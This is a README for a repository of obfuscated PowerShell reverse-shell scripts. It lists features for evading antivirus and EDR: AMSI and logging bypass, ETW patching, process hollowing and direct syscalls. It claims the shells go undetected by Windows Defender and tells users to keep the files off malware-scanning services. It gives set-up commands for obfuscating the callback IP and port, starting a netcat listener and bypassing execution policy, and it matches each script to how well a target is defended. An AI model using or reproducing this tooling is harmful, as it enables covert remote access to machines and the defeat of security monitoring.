# Obfuscated PowerShell Reverse Shells

Collection of obfuscated PowerShell reverse shells with AV/EDR evasion techniques for authorized security testing.

## Warning

**Authorized testing only. Illegal use prohibited.**

Do **NOT** upload these files to public malware-scanning services such as VirusTotal or HybridAnalysis. Doing so may compromise testing objectives and reduce effectiveness.

## Structure

```
reverse-shells/
├── scripts/     # PowerShell reverse shell scripts
├── docs/        # Documentation and license
└── tools/       # Utility tools
```

## Scripts

### reverse_shell.ps1
Basic PowerShell reverse shell with Base64 obfuscation. Uses .NET reflection and encoded IP/port configuration. Suitable for environments without EDR.

**Features:**
- Base64 obfuscation for IP and port
- .NET reflection techniques
- Simple TCP connection

### reverse_shell_dll_memory.ps1
Advanced reverse shell with in-memory DLL compilation and loading. No files written to disk during execution.

**Features:**
- C# compilation in memory via `csc.exe` or `Add-Type`
- Reflective DLL loading via `Assembly.Load(byte[])`
- Automatic reconnection with retry logic
- Background thread execution
- Compatible Windows 10/11

### reverse_shell_dll_memory_edr_bypass.ps1
Complete EDR bypass solution with AMSI and PowerShell Logging evasion. Maximum stealth for protected environments.

**Features:**
- All features from `reverse_shell_dll_memory.ps1`
- AMSI bypass via memory patch (Base64 encoded)
- PowerShell Script Block Logging bypass
- ETW event tracing disabled
- Undetectable by Windows Defender

### reverse_shell_process_hollowing_syscallsv2.ps1
Process Hollowing implementation using direct syscalls. Creates suspended process and replaces memory with shellcode.

**Features:**
- Complete Process Hollowing via `NtUnmapViewOfSection`
- Direct syscalls (NtCreateThreadEx, NtQueryInformationProcess)
- ETW patching (multiple functions)
- In-memory shellcode execution
- Creates process from legitimate executable (notepad.exe)

### reverse_shell_process_injection_advanced.ps1
Advanced process injection with multiple techniques and EDR evasion.

**Features:**
- Multiple injection methods
- Direct syscall usage
- EDR evasion techniques
- Stealth process injection

## Quick Start

### 1. Configure IP and Port

Encode IP to Base64:
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("192.168.1.100"))
```

Calculate port (example: 4444):
```powershell
[Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12)
```

Modify in script (line ~6-7):
```powershell
$ipB = [Convert]::FromBase64String('YOUR_IP_BASE64');
$prt = [int](([Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12)));
```

### 2. Start Listener

```bash
nc -nlvp 4444
```

### 3. Execute Script

```powershell
cd scripts
.\reverse_shell_dll_memory_edr_bypass.ps1
```

## Feature Comparison

| Feature | Basic | DLL Memory | EDR Bypass | Process Hollowing |
|---------|-------|------------|------------|-------------------|
| AMSI Bypass | No | No | Yes | Yes |
| ETW Patch | No | No | Yes | Yes |
| Reflective Loading | No | Yes | Yes | Yes |
| In-Memory Execution | No | Yes | Yes | Yes |
| Process Hollowing | No | No | No | Yes |
| PowerShell Logging Bypass | No | No | Yes | Yes |
| Direct Syscalls | No | No | No | Yes |

## Usage Recommendations

**Basic environment (no EDR):** Use `reverse_shell.ps1`

**Windows Defender present:** Use `reverse_shell_dll_memory.ps1`

**EDR/AMSI protection:** Use `reverse_shell_dll_memory_edr_bypass.ps1`

**Maximum stealth required:** Use `reverse_shell_process_hollowing_syscallsv2.ps1`

## Troubleshooting

**Connection refused:** Verify listener is active, check IP/port in script, verify firewall rules

**Script closes immediately:** Use `reverse_shell_dll_memory.ps1` or `reverse_shell_dll_memory_edr_bypass.ps1` for better stability

**C# compilation error:** Script automatically falls back to `Add-Type` if `csc.exe` unavailable. Ensure .NET Framework 4.0+ is installed.

**Execution policy error:**
```powershell
powershell.exe -ExecutionPolicy Bypass -File .\reverse_shell_dll_memory_edr_bypass.ps1
```

## Technical Details

- Tested on Windows 10/11
- Windows Defender: Not detected
- EDR detection: Varies by product and version
- All payloads execute in memory (no files on disk)
- Base64 obfuscation for configuration

## Tools

**prepare_for_github.ps1** - Replaces hardcoded IPs with placeholders before GitHub publication

## Before Publishing to GitHub

Execute the preparation script:
```powershell
.\tools\prepare_for_github.ps1
```

This replaces all IPs `192.168.199.150` with `192.168.1.100` (placeholder).

## Author

Florent Vinai

## License

See [LICENSE](docs/LICENSE) for details.
